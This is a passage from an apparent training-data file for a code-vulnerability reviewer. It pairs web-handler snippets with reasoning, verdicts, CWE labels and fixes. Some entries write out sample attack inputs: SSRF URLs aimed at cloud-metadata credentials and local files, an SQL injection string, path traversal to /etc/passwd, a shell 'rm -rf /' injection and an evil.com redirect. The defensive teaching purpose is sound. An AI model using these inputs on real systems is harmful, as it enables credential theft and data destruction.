This is defensive numeric parsing — the canonical safe pattern for converting untrusted string-or-numeric input to an integer without raising.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: defensive int coercion with explicit ValueError/TypeError handling; no I/O, no sink
fix: none
""",

    # cvefixes:3 — Python test file for openapi snake_case
    "shape1:cvefixes:3": """<think>
A pytest test file exercising openapi_python_client.utils.snake_case. The assertions check various ASCII inputs ("HTTP" → "http", "HTTPResponse" → "http_response", etc.). Pure test code calling a string-transform helper.

No network input, no file I/O, no shell, no SQL. Test files can carry CVE-patch context because they exercise patched logic, but the test itself doesn't introduce a vulnerability.
</think>

status: safe
cwe: none
severity: none
line: none
trace: pytest test file for snake_case string transform; no production sink, no untrusted input
fix: none
""",

    # clean_code_mined:4 — Python lexer property delegate
    "shape1:clean_code_mined:4": """<think>
A lexer property that returns get_lexer(self). The docstring describes it as "The lexer for this environment." This is delegation to a factory function with self as the only argument.

No external input, no sink. Pure framework plumbing.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: property getter delegating to a factory function; no untrusted input, no sink
fix: none
""",

    # clean_code_mined:5 — Python SQLAlchemy istartswith helper
    "shape1:clean_code_mined:5": """<think>
A SQLAlchemy comparison-operator implementation: istartswith_op forwards its arguments to _escaped_like_impl with a.istartswith as the operator. The implementation is the LIKE-with-escape pattern that SQLAlchemy uses for case-insensitive prefix matches.

The escape parameter and autoescape flag are part of the framework contract for safely interpolating user values into LIKE patterns. No raw SQL is built here — the actual SQL emission happens deeper in SQLAlchemy and uses parameter binding.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: SQLAlchemy comparison-operator helper delegating to the framework's escape-aware LIKE implementation; no raw SQL, no sink
fix: none
""",

    # morefixes:22 — Python Django AsgiHandler
    "shape1:morefixes:22": """<think>
Django's AsgiHandler.handle method. It receives an ASGI scope, sends, and body, reads root_path from the scope, fires the request_started signal, and constructs a Request object from scope+body.

scope and body come from the ASGI server (uvicorn/daphne), not directly from network bytes — they've been parsed, validated, and shape-checked at the ASGI server layer. The Request constructor does Django's normal input handling.

No raw network input reaches a dangerous sink in this snippet. Standard framework plumbing.
</think>

status: safe
cwe: none
severity: none
line: 5
trace: ASGI handler dispatching scope+body to Django request layer; framework-validated inputs, no raw sink
fix: none
""",

    # python_vulns:2 — Python, vuln, CWE-918 SSRF via thumbnail fetcher
    "shape1:python_vulns:2": """<think>
thumbnail(image_url) calls requests.get(image_url) and returns the response bytes. image_url is passed in from a caller — if any caller exposes this to user input (a route handler reading a URL parameter), it's a textbook SSRF primitive.

No URL parsing, no scheme allowlist, no host check, no redirect handling. The python_vulns label CWE-918 is correct.

attacker sets image_url='http://169.254.169.254/latest/meta-data/iam/security-credentials/' → server fetches AWS instance credentials and returns them. Or image_url='http://localhost:6379/INFO' to probe internal Redis. Or image_url='file:///etc/passwd' (requests supports file:// via the file scheme adapter when installed).
</think>

status: confirmed
cwe: CWE-918
severity: HIGH
line: 4
trace: image_url → requests.get(image_url); no scheme allowlist, no host check, no DNS resolution defense
fix: parse with urlparse, require scheme in {"http","https"}, check the resolved host against an allowlist while rejecting RFC1918/loopback/cloud-metadata ranges; set a timeout and allow_redirects=False
""",

    # morefixes:23 — JS error sanitizer (the FIX side: scrubs password/secret keys)
    "shape1:morefixes:23": """<think>
errors.sanitizeErrorRequestData walks the request data object on an error and replaces any value whose key matches /password|secret/i with '[SANITIZED]'.

This is the defensive scrubbing pattern: before logging or returning an error blob that contains the original request data, the code removes sensitive values so they don't leak into logs or error responses.

The visible code IS the scrubbing logic. No untrusted-data sink is created here — the scrubber merely transforms the error object. The morefixes label may reflect the FIX commit (this scrubber was added because the unredacted version was the vulnerability).
</think>

status: safe
cwe: none
severity: none
line: 6
trace: error-data sanitizer that replaces password/secret-keyed values with '[SANITIZED]' before downstream consumption
fix: none
""",
}


# ============================================================
# SHAPE 2 — template helper + per-task data
# ============================================================

SHAPE2_DATA: dict[str, dict] = {
    # Each entry: caller_code + reasoning body (the variable parts).

    # ---- Existing valid responses (from prior runs) — kept for shape2 task_id stability ----

    "shape2:command_injection:run_command:1": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from utils.shell import run_command

app = Flask(__name__)

@app.route('/api/exec', methods=['POST'])
def execute():
    payload = request.json or {}
    cmd = payload.get('cmd')
    if not cmd:
        abort(400)
    result = run_command(cmd)
    return jsonify({"output": result})""",
        "reasoning": """The route /api/exec accepts POST. It reads request.json.get('cmd') into a local called cmd. The only check is "is it non-empty" — there is no allowlist, no shape validation, no escaping.

That cmd is then passed straight to run_command(cmd), which is imported from utils/shell.py. I do not have utils/shell.py visible in this snippet.

The verdict depends entirely on what run_command does with its argument. If it constructs a shell line by concatenation, or calls subprocess with shell=True and unquoted interpolation, this is a textbook command-injection sink. If it uses subprocess.run([cmd_token, *args], shell=False) with a strict allowlist, it could be safe.

Without seeing utils/shell.py I cannot give a final verdict — guessing here would be wrong. The correct action is to fetch run_command's definition.""",
    },

    "shape2:sql_injection:query_user:0": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from db.queries import query_user

app = Flask(__name__)

@app.route('/profile')
def profile():
    user_id = request.args.get('user_id')
    if not user_id:
        abort(400)
    row = query_user(user_id)
    if not row:
        abort(404)
    return jsonify(row)""",
        "reasoning": """This Flask handler reads user_id from request.args.get('user_id'). That is a GET-querystring value — untrusted input. The only check is non-empty; there is no type cast, no regex, no integer parse.

The value is passed verbatim to query_user(user_id), which is imported from db/queries.py. That file is not visible in this snippet.

Whether this is SQL injection depends on query_user. If it constructs the query as an f-string or %-concatenation it is exploitable. If it uses parameterized binding such as cur.execute("... id = ?", (user_id,)), it is safe even with raw user input.

I cannot tell from the caller alone. Guessing would be wrong; the verdict literally depends on query_user's body.""",
    },

    "shape2:ssrf:fetch_url:2": {
        "caller_code": """from flask import Flask, request, jsonify
from services.http_client import fetch_url

app = Flask(__name__)

@app.route('/proxy')
def proxy():
    target_url = request.args.get('url')
    if not target_url:
        return jsonify({"error": "url required"}), 400
    body = fetch_url(target_url)
    return body""",
        "reasoning": """The /proxy endpoint reads target_url from request.args.get('url'). That is attacker-controlled — anyone hitting the endpoint can supply any URL.

target_url is forwarded as-is to fetch_url(target_url), imported from services/http_client.py. No URL parsing, no scheme check, no host allowlist happens in this file.

This is a textbook SSRF setup IF fetch_url performs an unconditional outbound fetch. fetch_url could be safe if it validates the scheme (https only) and checks the resolved host against an allowlist while preventing DNS-rebinding. It could also be unsafe in the obvious way.

I cannot tell which from the caller. The verdict depends on fetch_url's body.""",
    },

    "shape2:xss_via_template:render_html:3": {
        "caller_code": """from flask import Flask, request, Response
from templates.render import render_html

app = Flask(__name__)

@app.route('/comment', methods=['POST'])
def submit():
    comment = request.form.get('comment', '')
    body = render_html(comment)
    return Response(body, mimetype='text/html')""",
        "reasoning": """/comment is POST with form data. comment is request.form.get('comment') — untrusted user input, no length cap, no validation.

comment is passed straight into render_html and the returned body is sent back as text/html. So whatever render_html emits will be parsed by the browser.

This is a stored/reflected XSS sink IF render_html performs raw substitution. It is safe IF render_html uses Jinja2 with autoescape=True, or markupsafe.escape, or a safe-by-default API.

I cannot tell from the caller alone. The verdict depends on render_html.""",
    },

    "shape2:path_traversal:load_file:4": {
        "caller_code": """from flask import Flask, request, abort, Response
from io.files import load_file

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('name')
    if not filename:
        abort(400)
    blob = load_file(filename)
    return Response(blob, mimetype='application/octet-stream')""",
        "reasoning": """/download reads filename from request.args.get('name') — attacker-controlled querystring. The only validation is non-empty.

filename is passed to load_file, imported from io/files.py. We do not see that file here.

The verdict depends on what load_file does with the name. Vulnerable: concatenation onto a base directory with no resolution check — '?name=../../etc/passwd' walks out. Safe: pathlib resolve + verify the resolved path stays inside the base directory.

I cannot tell from the caller alone. The verdict depends on load_file's implementation.""",
    },

    "shape2:insecure_deserialization:deserialize_payload:5": {
        "caller_code": """from flask import Flask, request, jsonify
from serializers.blob import deserialize_payload

app = Flask(__name__)

@app.route('/import', methods=['POST'])
def import_data():
    raw_blob = request.data
    obj = deserialize_payload(raw_blob)
    return jsonify({"ok": True})""",
        "reasoning": """/import accepts POST. request.data is the raw body — attacker-controlled, arbitrary bytes.

The bytes are passed to deserialize_payload, imported from serializers/blob.py. That file is not visible here.

The verdict turns entirely on what deserialize_payload calls. If it uses pickle.loads or yaml.load (without SafeLoader), an attacker who controls the bytes gains arbitrary code execution at deserialization time. If it uses json.loads, or msgpack with type-strict decoding, it is safe.

I cannot tell from the caller alone. Guessing would be wrong.""",
    },

    "shape2:ldap_injection:search_user:6": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from ldap.search import search_user

app = Flask(__name__)

@app.route('/users/search')
def search():
    query_str = request.args.get('q')
    if not query_str:
        abort(400)
    results = search_user(query_str)
    return jsonify(results)""",
        "reasoning": """/users/search reads query_str from request.args.get('q'). That is an HTTP query parameter — attacker-controlled. The only check is non-empty.

The value is forwarded directly into search_user(query_str), imported from ldap/search.py — which is not visible.

LDAP filter strings have metacharacters: '*', '(', ')', '\\', NUL. If search_user composes the filter via f-string and does not escape with ldap.filter.escape_filter_chars, an attacker can break out of the intended filter.

Whether this is exploitable depends on search_user's body. Guessing would be wrong.""",
    },

    "shape2:xml_xxe:parse_xml_doc:7": {
        "caller_code": """from flask import Flask, request, jsonify
from parsers.xml import parse_xml_doc

app = Flask(__name__)

@app.route('/import-xml', methods=['POST'])
def import_xml():
    xml_bytes = request.data
    doc = parse_xml_doc(xml_bytes)
    return jsonify({"root": doc.tag if doc is not None else None})""",
        "reasoning": """/import-xml accepts POST. request.data is the raw request body — attacker-controlled bytes, no size limit and no shape check in this caller.

The bytes are passed straight into parse_xml_doc, imported from parsers/xml.py. We do not see that file.

The XXE question turns entirely on parse_xml_doc's choice of parser. Vulnerable: xml.etree.ElementTree.fromstring on older Pythons, or lxml.etree.fromstring with default resolver. Safe: defusedxml.ElementTree.fromstring (entity expansion blocked by default).

I cannot determine which the helper uses from the caller. Guessing would be wrong.""",
    },

    # ---- New responses for n=16 ----

    "shape2:open_redirect:build_redirect:8": {
        "caller_code": """from flask import Flask, request, redirect
from auth.redirect import build_redirect

app = Flask(__name__)

@app.route('/login/callback')
def login_callback():
    next_url = request.args.get('next', '/dashboard')
    target = build_redirect(next_url)
    return redirect(target)""",
        "reasoning": """/login/callback reads next_url from request.args.get('next', '/dashboard'). That's attacker-controlled — anyone can craft a phishing link like /login/callback?next=https://evil.com.

The value is passed to build_redirect, imported from auth/redirect.py. We don't see that helper.

The verdict depends on what build_redirect does. Vulnerable: returns the raw next_url so Flask's redirect() sends the user to evil.com — that's an open redirect (CWE-601). Safe: parses the URL, requires it to be relative (no scheme/host) or matches an allowlist of trusted hosts.

Without seeing build_redirect I cannot conclude.""",
    },

    "shape2:insecure_jwt_verify:verify_token:9": {
        "caller_code": """from flask import Flask, request, abort, jsonify
from auth.jwt import verify_token

app = Flask(__name__)

@app.route('/me')
def me():
    token = request.cookies.get('jwt')
    if not token:
        abort(401)
    claims = verify_token(token)
    return jsonify({"user": claims.get('sub')})""",
        "reasoning": """/me reads token from request.cookies.get('jwt'). The cookie value is attacker-controlled — a malicious client can supply any bytes.

token is passed to verify_token, imported from auth/jwt.py. That helper isn't visible.

The verdict depends on verify_token. Vulnerable: accepts alg='none' (CWE-347), or trusts the alg field from the token header without pinning, or uses jwt.decode without a verify_signature step. Safe: pins algorithms=['HS256'] (or the deployed-correct one), uses a strong secret from the environment, verifies signature, expiration, and issuer.

I cannot tell from the caller alone.""",
    },

    "shape2:sql_injection:queryByEmail:10": {
        "caller_code": """const express = require('express');
const { queryByEmail } = require('./db/users');

const app = express();
app.use(express.json());

app.post('/users/lookup', async (req, res) => {
  const email = req.body.email;
  if (!email) return res.status(400).json({error: 'email required'});
  const row = await queryByEmail(email);
  res.json(row);
});""",
        "reasoning": """POST /users/lookup reads email from req.body.email. That's untrusted client JSON. The only check is presence — no email-format validation, no length cap.

email is passed to queryByEmail, imported from ./db/users. That helper's body isn't visible.

The verdict depends on queryByEmail's implementation. Vulnerable: builds the SQL by template-literal interpolation like `SELECT ... WHERE email = '${email}'`. Safe: uses a parameterized client like pg with `query('SELECT ... WHERE email = $1', [email])` or a query builder.

I cannot tell from the caller. Guessing the verdict would be wrong.""",
    },

    "shape2:ssrf:proxyRequest:11": {
        "caller_code": """const express = require('express');
const { proxyRequest } = require('./lib/http');

const app = express();

app.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('url required');
  const body = await proxyRequest(target);
  res.send(body);
});""",
        "reasoning": """/proxy reads target from req.query.url. Attacker-controlled URL on a public endpoint.

target is forwarded to proxyRequest, imported from ./lib/http. That helper isn't visible.

The verdict depends on proxyRequest. Vulnerable: straight axios.get(target) or fetch(target) with no URL parsing, no scheme allowlist, no host check — classic SSRF, allows pivot to internal services and AWS metadata. Safe: parses with new URL(target), checks scheme is https:, resolves host and rejects RFC1918/loopback/cloud-metadata ranges, sets a timeout.

I cannot tell from the caller alone.""",
    },

    "shape2:rce_via_shell:execCommand:12": {
        "caller_code": """const express = require('express');
const { execCommand } = require('./lib/exec');

const app = express();
app.use(express.json());

app.post('/admin/exec', async (req, res) => {
  const command = req.body.cmd;
  if (!command) return res.status(400).send('cmd required');
  const result = await execCommand(command);
  res.json({output: result});
});""",
        "reasoning": """POST /admin/exec reads command from req.body.cmd. Raw client JSON — attacker-controlled if the endpoint isn't properly auth-gated.

command is passed to execCommand, imported from ./lib/exec. We don't see that helper.

The verdict depends on execCommand. Vulnerable: `child_process.exec(command)` or `child_process.execSync(command)` — both invoke a shell on the string, so '; rm -rf /' is fatal. Safe: child_process.spawn(argv0, [...argv1], {shell: false}) with a strict argv allowlist.

I cannot tell from the caller alone — must fetch the helper.""",
    },

    "shape2:prototype_pollution:mergeOptions:13": {
        "caller_code": """const express = require('express');
const { mergeOptions } = require('./utils/merge');

const app = express();
app.use(express.json());

const DEFAULTS = {pageSize: 20, sort: 'asc'};

app.post('/search', (req, res) => {
  const user_opts = req.body || {};
  const opts = mergeOptions(DEFAULTS, user_opts);
  res.json({searched: true, opts});
});""",
        "reasoning": """POST /search reads req.body into user_opts. That's an attacker-controlled JSON object — they can pass any keys, including __proto__ or constructor.prototype.

user_opts is passed to mergeOptions(DEFAULTS, user_opts), imported from ./utils/merge. We don't see that helper.

The verdict depends on mergeOptions. Vulnerable: a recursive deep-merge that walks src[key] = obj[key] || {} into __proto__, polluting Object.prototype globally (CWE-1321). Safe: an Object.create(null)-based merge, or a merge that explicitly skips __proto__/constructor/prototype keys, or a structuredClone-based copy.

I cannot tell from the caller alone.""",
    },

    "shape2:path_traversal:serveFile:14": {
        "caller_code": """const express = require('express');
const { serveFile } = require('./files/serve');

const app = express();

app.get('/files/:name', async (req, res) => {
  const filename = req.params.name;
  if (!filename) return res.status(400).send('name required');
  const buf = await serveFile(filename);
  res.send(buf);
});""",
        "reasoning": """/files/:name reads filename from req.params.name. Route params are attacker-controlled — clients can craft any URL.

filename is passed to serveFile, imported from ./files/serve. We don't see that helper.

The verdict depends on serveFile. Vulnerable: path.join(BASE, filename) with no resolution check — '..%2F..%2Fetc%2Fpasswd' (Express decodes URL-encoded path components) walks out. Safe: path.resolve(BASE, filename) then startsWith(BASE + path.sep) verification.

I cannot tell from the caller alone.""",
    },

    "shape2:sql_injection:findOrderById:15": {
        "caller_code": """import express, { Request, Response } from 'express';
import { findOrderById } from './db/orders';

const app = express();

app.get('/orders/:id', async (req: Request, res: Response) => {
  const orderId = req.params.id;
  if (!orderId) return res.status(400).send('id required');
  const order = await findOrderById(orderId);
  if (!order) return res.status(404).send('not found');
  res.json(order);
});""",
        "reasoning": """TypeScript Express route GET /orders/:id reads orderId from req.params.id. Route params are attacker-controlled — the type signature (string) does not enforce numeric content.

orderId is forwarded to findOrderById, imported from ./db/orders. We don't see that helper.

The verdict depends on findOrderById. Vulnerable: builds raw SQL by template-literal interpolation (`SELECT ... WHERE id = '${orderId}'`). Safe: uses a parameterized typed client (Prisma, TypeORM repository, or pg with positional params).

I cannot tell from the caller alone.""",
    },

    # --- n=24 additions (5 new helpers — TS + React) ---

    "shape2:ssrf:fetchAvatar:16": {
        "caller_code": """import express, { Request, Response } from 'express';
import { fetchAvatar } from './services/avatar';

const app = express();
app.use(express.json());

app.post('/profile/avatar', async (req: Request, res: Response) => {
  const url: string = req.body.url;
  if (!url) return res.status(400).json({error: 'url required'});
  const blob = await fetchAvatar(url);
  res.type('image/png').send(blob);
});""",
        "reasoning": """POST /profile/avatar reads url from req.body.url. Client-supplied JSON — attacker-controlled, no scheme check, no host check.

url is forwarded to fetchAvatar, imported from ./services/avatar. We don't see that helper.

The verdict depends on fetchAvatar. Vulnerable: a straight axios.get(url, {responseType: 'arraybuffer'}) with no URL parsing — attacker passes http://169.254.169.254/latest/meta-data/ and the server fetches cloud metadata. Safe: parses URL, requires https, resolves and validates the host against an allowlist or rejects private ranges.

I cannot tell from the caller alone.""",
    },

    "shape2:insecure_deserialization:parseToken:17": {
        "caller_code": """import express, { Request, Response } from 'express';
import { parseToken } from './auth/token';

const app = express();

app.get('/api/me', async (req: Request, res: Response) => {
  const raw = req.cookies.session as string | undefined;
  if (!raw) return res.status(401).send('no session');
  const session = parseToken(raw);
  res.json({user: session.userId});
});""",
        "reasoning": """/api/me reads raw from req.cookies.session. Cookies are client-controlled — the value can be any bytes.

raw is forwarded to parseToken, imported from ./auth/token. We don't see that helper.

The verdict depends on parseToken. Vulnerable: a deserializer that runs constructor code from the raw input (Java-style ObjectInputStream, Python pickle, JS `eval` on a base64-encoded blob) — RCE primitive. Safe: jwt.verify with pinned alg + signature check, OR a typed JSON deserializer that validates schema.

I cannot tell from the caller alone — the deserializer choice IS the question.""",
    },

    "shape2:xss_via_dangerous_markdown:renderMarkdown:18": {
        "caller_code": """import express, { Request, Response } from 'express';
import { renderMarkdown } from './render/md';

const app = express();
app.use(express.json());

app.post('/posts/preview', (req: Request, res: Response) => {
  const markdown_input: string = req.body.content;
  if (!markdown_input) return res.status(400).send('content required');
  const html = renderMarkdown(markdown_input);
  res.type('text/html').send(html);
});""",
        "reasoning": """POST /posts/preview reads markdown_input from req.body.content. Untrusted client text.

markdown_input is passed to renderMarkdown, imported from ./render/md. We don't see that helper. The result is sent as text/html — so the browser renders whatever HTML the helper produces.

The verdict depends on renderMarkdown. Vulnerable: marked.parse(input) or markdown-it().render(input) with no sanitization step, where raw <script> or onerror= in the source survives into the HTML output. Safe: renderer with sanitize:true, or piped through DOMPurify after parsing.

I cannot tell from the caller alone.""",
    },

    "shape2:xss_via_dangerouslysetinnerhtml:renderBio:19": {
        "caller_code": """import React from 'react';
import { renderBio } from '../helpers/profile';

export function ProfileCard({ profile }: { profile: { name: string; bio: string } }) {
  const html_blob = renderBio(profile.bio);
  return (
    <div className="profile-card">
      <h2>{profile.name}</h2>
      <div dangerouslySetInnerHTML={{ __html: html_blob }} />
    </div>
  );
}""",
        "reasoning": """ProfileCard receives profile from props (server-rendered or API response — externally sourced). profile.bio is user-supplied content (the user wrote their own bio).

bio is passed to renderBio, imported from ../helpers/profile. The returned html_blob is then inserted via dangerouslySetInnerHTML — React explicitly disables its default escaping for this prop.

The verdict depends on renderBio. Vulnerable: returns bio with minimal transformation, or marked.parse(bio) without sanitization — XSS via <img src=x onerror=...> in the bio. Safe: passes bio through DOMPurify.sanitize() with a tight allowlist of tags/attributes before returning.

I cannot tell from the component alone.""",
    },

    "shape2:open_redirect:navigateAfterLogin:20": {
        "caller_code": """import { useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { navigateAfterLogin } from '../auth/postLogin';

export function PostLoginRedirect() {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  useEffect(() => {
    const next_url = params.get('next') || '/dashboard';
    const target = navigateAfterLogin(next_url);
    navigate(target);
  }, [params, navigate]);
  return null;
}""",
        "reasoning": """PostLoginRedirect reads next_url from URLSearchParams.get('next'). That's client-side URL-controlled — anyone can craft a phishing link.

next_url is passed to navigateAfterLogin, imported from ../auth/postLogin. The result feeds react-router's navigate, which will route the user to that URL.

The verdict depends on navigateAfterLogin. Vulnerable: returns next_url verbatim → navigate('https://evil.com') → user lands on attacker site after login. Safe: parses with new URL(...,location.href) and requires the result's origin to equal window.location.origin; OR matches against a relative-only regex.

I cannot tell from the component alone.""",
    },
}


# ============================================================
# SHAPE 3 — template helper + per-task data
# ============================================================

SHAPE3_DATA: dict[str, dict] = {

    # ---- Existing valid responses ----

    "shape3:dismiss:run_command:1": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from utils.shell import run_command

app = Flask(__name__)

@app.route('/api/exec', methods=['POST'])
def execute():
    payload = request.json or {}
    cmd = payload.get('cmd')
    if not cmd:
        abort(400)
    result = run_command(cmd)
    return jsonify({"output": result})""",
        "caller_file": "app.py",
        "helper_code": """import subprocess

ALLOWED = {"status", "uptime", "version"}

def run_command(cmd):
    if cmd not in ALLOWED:
        raise ValueError(f"command not allowed: {cmd}")
    table = {
        "status":  ["systemctl", "is-active", "myapp"],
        "uptime":  ["uptime", "-p"],
        "version": ["myapp", "--version"],
    }
    return subprocess.run(table[cmd], capture_output=True, text=True, check=True).stdout""",
        "helper_file": "utils/shell.py",
        "reasoning": """Trace the caller first. /api/exec reads cmd from request.json. Raw user input. That cmd is passed to run_command. So far the caller has done no validation — the safety question depends entirely on run_command.

Now examine run_command in utils/shell.py.
1. First gate: cmd must be a member of the ALLOWED set. Any other value raises before the subprocess is touched.
2. Second gate: the dispatch table maps the cmd string to a FIXED argv list. The user-supplied cmd is used as a dict key, never interpolated into a shell string.
3. subprocess.run is called with a list argument and shell defaults to False. No shell interpretation of any user value.

Even though the caller forwarded raw input, the helper's allowlist plus fixed-argv design means a malicious cmd like "status; rm -rf /" is rejected at the allowlist check before subprocess sees anything. The invariant is enforced at the correct boundary.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "caller forwards cmd unchecked, but run_command rejects non-allowlisted values and dispatches to a fixed argv with no shell",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:fetch_url:2": {
        "caller_code": """from flask import Flask, request, jsonify
from services.http_client import fetch_url

app = Flask(__name__)

@app.route('/proxy')
def proxy():
    target_url = request.args.get('url')
    if not target_url:
        return jsonify({"error": "url required"}), 400
    body = fetch_url(target_url)
    return body""",
        "caller_file": "app.py",
        "helper_code": """import requests

def fetch_url(target_url):
    resp = requests.get(target_url, timeout=10)
    resp.raise_for_status()
    return resp.text""",
        "helper_file": "services/http_client.py",
        "reasoning": """Caller side first. /proxy reads target_url from request.args.get('url'). Public-facing — anyone hitting the endpoint controls this value.

target_url goes into fetch_url. Now I can see fetch_url's body:
1. requests.get(target_url, timeout=10) with NO URL parsing.
2. No scheme allowlist.
3. No host allowlist — http://169.254.169.254/latest/meta-data/ or http://localhost:6379/ both reachable.

This is classic server-side request forgery. An attacker passes ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ and the server returns AWS instance credentials.

Verdict: confirmed. CWE-918.""",
        "status": "confirmed",
        "cwe": "CWE-918",
        "severity": "HIGH",
        "trace": "request.args['url'] → target_url → fetch_url → requests.get with no scheme/host validation; attacker can pivot to internal services or cloud metadata",
        "fix": "parse the URL, require scheme in {\"http\",\"https\"}, resolve the host and reject RFC1918 / 169.254/16 / loopback / cloud-metadata ranges before issuing the request",
        "follow_ups": [],
    },

    "shape3:confirm:query_user:0": {
        "caller_code": """from flask import Flask, request, jsonify, abort
from db.queries import query_user

app = Flask(__name__)

@app.route('/profile')
def profile():
    user_id = request.args.get('user_id')
    if not user_id:
        abort(400)
    row = query_user(user_id)
    if not row:
        abort(404)
    return jsonify(row)""",
        "caller_file": "app.py",
        "helper_code": """import sqlite3

def query_user(user_id):
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    query = f"SELECT id, name, email FROM users WHERE id = '{user_id}'"
    return cur.execute(query).fetchone()""",
        "helper_file": "db/queries.py",
        "reasoning": """Trace: /profile reads user_id from request.args. Untrusted, no type cast.

Now query_user is visible. It builds the SQL string with an f-string: f"SELECT ... WHERE id = '{user_id}'". The user-supplied user_id is interpolated directly. cur.execute is called single-string form — no parameter tuple.

Inject ?user_id=1' OR '1'='1 and the query returns all rows. UNION SELECT for data exfiltration is also possible.

Verdict: confirmed. CWE-89.""",
        "status": "confirmed",
        "cwe": "CWE-89",
        "severity": "HIGH",
        "trace": "request.args['user_id'] → query_user → f-string interpolation into SQL → cur.execute single-string form; no parameter binding",
        "fix": "cur.execute(\"SELECT id, name, email FROM users WHERE id = ?\", (user_id,))",
        "follow_ups": [],
    },

    "shape3:dismiss:deserialize_payload:5": {
        "caller_code": """from flask import Flask, request, jsonify
from serializers.blob import deserialize_payload

app = Flask(__name__)

@app.route('/import', methods=['POST'])
def import_data():
    raw_blob = request.data
    obj = deserialize_payload(raw_blob)
    return jsonify({"ok": True, "kind": obj.get("type")})""",
        "caller_file": "app.py",
        "helper_code": """import json

ALLOWED_TYPES = {"feature_flag", "experiment", "audit_event"}

def deserialize_payload(raw_blob):
    try:
        obj = json.loads(raw_blob.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        raise ValueError("invalid payload")
    if not isinstance(obj, dict):
        raise ValueError("payload must be an object")
    if obj.get("type") not in ALLOWED_TYPES:
        raise ValueError("unknown type")
    return obj""",
        "helper_file": "serializers/blob.py",
        "reasoning": """Caller: raw_blob = request.data, attacker-controlled bytes. Forwarded to deserialize_payload.

Helper uses json.loads (safe parser, no code execution semantics), then validates the result is a dict, then checks the 'type' field against a hard-coded allowlist of three strings.

No pickle, no yaml without SafeLoader, no eval. The composition is SAFE deserializer → strict shape check → field allowlist. Even maliciously-crafted JSON cannot escape into code execution.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "caller forwards raw POST bytes, helper uses json.loads (safe) + dict-shape check + type-field allowlist; no RCE primitive",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    "shape3:confirm:load_file:4": {
        "caller_code": """from flask import Flask, request, abort, Response
from io.files import load_file

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('name')
    if not filename:
        abort(400)
    blob = load_file(filename)
    return Response(blob, mimetype='application/octet-stream')""",
        "caller_file": "app.py",
        "helper_code": """BASE_DIR = "/var/uploads/"

def load_file(filename):
    full_path = BASE_DIR + filename
    with open(full_path, "rb") as f:
        return f.read()""",
        "helper_file": "io/files.py",
        "reasoning": """Caller: filename comes from request.args. No validation. Forwarded to load_file.

Helper: full_path = BASE_DIR + filename. Naive string concatenation with no path resolution and no containment check.

?name=../../etc/passwd → full_path='/var/uploads/../../etc/passwd' → open() resolves to '/etc/passwd' → server returns the password file.

Verdict: confirmed. CWE-22.""",
        "status": "confirmed",
        "cwe": "CWE-22",
        "severity": "HIGH",
        "trace": "request.args['name'] → filename → string-concat onto BASE_DIR → open(); no path resolution, no containment check",
        "fix": "resolve the candidate path and verify it remains under BASE_DIR — target = (Path(BASE_DIR) / filename).resolve(); reject if BASE_DIR.resolve() not in target.parents",
        "follow_ups": [],
    },

    "shape3:dismiss:parse_xml_doc:7": {
        "caller_code": """from flask import Flask, request, jsonify
from parsers.xml import parse_xml_doc

app = Flask(__name__)

@app.route('/import-xml', methods=['POST'])
def import_xml():
    xml_bytes = request.data
    doc = parse_xml_doc(xml_bytes)
    return jsonify({"root": doc.tag if doc is not None else None})""",
        "caller_file": "app.py",
        "helper_code": """from defusedxml.ElementTree import fromstring

MAX_BYTES = 1_000_000

def parse_xml_doc(xml_bytes):
    if len(xml_bytes) > MAX_BYTES:
        raise ValueError("xml too large")
    return fromstring(xml_bytes)""",
        "helper_file": "parsers/xml.py",
        "reasoning": """Caller: raw bytes from request.data go into parse_xml_doc.

Helper imports fromstring from defusedxml.ElementTree, not from xml.etree.ElementTree or lxml. defusedxml disables external entity expansion (XXE), external DTD loading, and the billion-laughs attack by default. A 1 MB size cap is enforced before parsing.

The known XML attack surface (XXE for SSRF/file read, billion-laughs DoS, external DTD pivot) is closed by defusedxml's defaults.

Verdict: safe.""",
        "status": "safe",
        "cwe": None,
        "severity": None,
        "trace": "caller forwards raw XML bytes; helper uses defusedxml.fromstring (XXE/DTD/billion-laughs disabled) plus a size cap",
        "fix": "n/a — code is safe",
        "follow_ups": [],
    },

    # ---- New responses for n=16 ----

    "shape3:confirm:build_redirect:8": {
        "caller_code": """from flask import Flask, request, redirect
from auth.redirect import build_redirect

app = Flask(__name__)

@app.route('/login/callback')
def login_callback():
    next_url = request.args.get('next', '/dashboard')
    target = build_redirect(next_url)
    return redirect(target)""",
        "caller_file": "app.py",
        "helper_code": """def build_redirect(next_url):
    \"\"\"Return the URL to redirect to after login.\"\"\"
    if next_url:
        return next_url
    return '/dashboard'""",
        "helper_file": "auth/redirect.py",
        "reasoning": """Caller: next_url from request.args.get('next', '/dashboard') is attacker-controlled. Passed to build_redirect.

Now examine build_redirect. It returns next_url verbatim when truthy. No url parsing, no scheme check, no host allowlist, no relative-only enforcement. Flask's redirect() will then issue a 302 to whatever string the helper returned.

Attacker crafts /login/callback?next=https://evil.com → build_redirect returns 'https://evil.com' → server issues 302 → victim's browser navigates to evil.com after login. Classic open-redirect phishing primitive.

Verdict: confirmed. CWE-601.""",
        "status": "confirmed",
        "cwe": "CWE-601",
        "severity": "MEDIUM",
        "trace": "request.args['next'] → next_url → build_redirect (returns as-is) → flask.redirect; no scheme/host check, no relative-only enforcement",
        "fix": "parse with urlparse; require an empty scheme and netloc (i.e., relative path only) OR check the host against an explicit allowlist before returning",
        "follow_ups": [],
    },

    "shape3:confirm_hop:execCommand:12": {
